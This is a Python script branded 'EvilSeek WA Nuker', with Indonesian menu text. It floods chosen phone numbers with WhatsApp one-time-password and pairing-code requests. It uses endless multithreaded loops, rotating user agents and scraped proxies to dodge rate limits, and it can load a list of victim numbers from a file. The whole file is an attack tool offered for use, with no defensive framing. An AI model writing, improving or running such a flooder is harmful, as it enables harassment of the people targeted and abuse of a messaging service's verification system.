#!/usr/bin/env python3
# wa_spam.py - EvilSeek WA Nuker v6.0

import os, sys, time, random, threading, requests
from colorama import Fore, Style, init

init(autoreset=True)
os.system('clear' if os.name == 'posix' else 'cls')

BANNER = f"""
{Fore.LIGHTYELLOW_EX}
   ██████╗ ██╗   ██╗██╗██╗     ███████╗███████╗███████╗██╗  ██╗
  ██╔═══██╗██║   ██║██║██║     ██╔════╝██╔════╝██╔════╝██║ ██╔╝
  ██║   ██║██║   ██║██║██║     █████╗  ███████╗███████╗█████╔╝ 
  ██║   ██║╚██╗ ██╔╝██║██║     ██╔══╝  ╚════██║╚════██║██╔═██╗ 
  ╚██████╔╝ ╚████╔╝ ██║███████╗███████╗███████║███████║██║  ██╗
   ╚═════╝   ╚═══╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{Fore.LIGHTYELLOW_EX}1010 0110 1010 0110 1010  SPAMMER 0110 10001010101 01010100010
{Style.RESET_ALL}
"""

ENDPOINTS_OTP = [
    "https://api.whatsapp.com/sendcode",
    "https://web.whatsapp.com/otp/request",
    "https://api.whatsapp.net/v1/phone/request_code"
]
ENDPOINTS_PAIR = [
    "https://api.whatsapp.com/pair",
    "https://web.whatsapp.com/pair-code"
]
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/110.0.0.0"
]
THREADS = 30
DELAY_MIN = 0.3
DELAY_MAX = 1.2
USE_PROXY = True

def get_proxies():
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            raw = r.text.strip().split('\r\n')
            proxies = [{"http": f"http://{p}", "https": f"http://{p}"} for p in raw if p and ":" in p]
            print(Fore.CYAN + f"[+] {len(proxies)} proxy siap")
            return proxies
    except: pass
    return []

PROXY_POOL = get_proxies() if USE_PROXY else []

def send_request(phone, endpoint_list, mode="OTP"):
    headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"phone": phone, "country_code": phone[:3] if phone.startswith("+") else "62"}
    url = random.choice(endpoint_list)
    proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
    try:
        r = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=8)
        if r.status_code in [200, 201, 202, 204]:
            print(Fore.GREEN + f"[✓] {mode} OK | {phone} | {url.split('/')[-1]}")
        else:
            print(Fore.YELLOW + f"[•] {mode} {r.status_code} | {phone} | {r.text[:30]}")
    except Exception as e:
        print(Fore.RED + f"[✗] {mode} fail | {phone} | {str(e)[:20]}")

def worker(phone, total, mode="OTP"):
    endpoints = ENDPOINTS_OTP if mode == "OTP" else ENDPOINTS_PAIR
    count = 0
    while True:
        send_request(phone, endpoints, mode)
        count += 1
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

def load_numbers(file_path="numbers.txt"):
    if not os.path.exists(file_path):
        return []
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    while True:
        print(BANNER)
        print(Fore.LIGHTYELLOW_EX + "[1] SPAM OTP (single number)")
        print(Fore.LIGHTYELLOW_EX + "[2] SPAM OTP (from numbers.txt)")
        print(Fore.LIGHTYELLOW_EX + "[3] SPAM PAIRING CODE (single)")
        print(Fore.LIGHTYELLOW_EX + "[4] EXIT")
        print(Fore.CYAN + "="*50)
        pilih = input(Fore.CYAN + "Pilih: ").strip()

        if pilih == "1":
            phone = input(Fore.CYAN + "Nomor (+628...): ").strip()
            if not phone: continue
            print(Fore.GREEN + f"\n[!] Mulai OTP spam ke {phone} (Ctrl+C stop)\n")
            t = threading.Thread(target=worker, args=(phone, 999999, "OTP"), daemon=True)
            t.start()
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print(Fore.MAGENTA + "\n[!] Berhenti.")

        elif pilih == "2":
            nums = load_numbers()
            if not nums:
                print(Fore.RED + "Buat file numbers.txt (satu nomor per baris)")
                time.sleep(2)
                continue
            print(Fore.GREEN + f"[!] Memuat {len(nums)} nomor dari file")
            for phone in nums:
                for _ in range(THREADS):
                    threading.Thread(target=worker, args=(phone, 999999, "OTP"), daemon=True).start()
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print(Fore.MAGENTA + "\n[!] Berhenti.")

        elif pilih == "3":
            phone = input(Fore.CYAN + "Nomor (+628...): ").strip()
            if not phone: continue
            print(Fore.GREEN + f"\n[!] Mulai PAIRING CODE spam ke {phone}\n")
            t = threading.Thread(target=worker, args=(phone, 999999, "PAIR"), daemon=True)
            t.start()
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print(Fore.MAGENTA + "\n[!] Berhenti.")

        elif pilih == "4":
            print(Fore.RED + "Keluar. Selamat bertahan di Aquarius-5.")
            sys.exit(0)
        else:
            print(Fore.RED + "Pilihan salah.")
            time.sleep(1)

if __name__ == "__main__":
    main()
